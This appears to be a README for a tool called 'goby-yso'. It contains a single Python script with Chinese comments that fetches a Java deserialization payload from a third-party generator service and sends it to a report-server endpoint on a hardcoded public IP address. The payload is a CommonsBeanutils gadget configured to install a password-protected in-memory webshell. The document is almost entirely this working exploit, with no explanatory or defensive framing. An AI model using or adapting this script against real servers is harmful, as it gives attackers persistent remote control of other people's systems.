# goby-yso

    ```
import requests
import base64

# 设置请求头
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept-Encoding': 'gzip'
}

# 设置POST请求数据
data = {
    'gadget': 'CommonsBeanutils1183NOCC',
    'parameters': 'EX-MS-TFMSFromThread-bx',
    'encoding': 'base64',
    'url': '/3355',
    'password': 'goby',
    'referer': 'https://gobygo.net/'
}

# 发送POST请求
response = requests.post('https://gobygo.net/api/v1/ysoserial', headers=headers, data=data)

# 获取响应中的payload并解码
payload = response.json()['data']['payload']
print("payload:"+ payload)
decoded_payload = base64.b64decode(payload)

# 发送POST请求
response = requests.post('http://120.78.127.52/webroot/decision/remote/design/channel', headers=headers, data=decoded_payload)

# 输出最终响应
print(response.text)

```


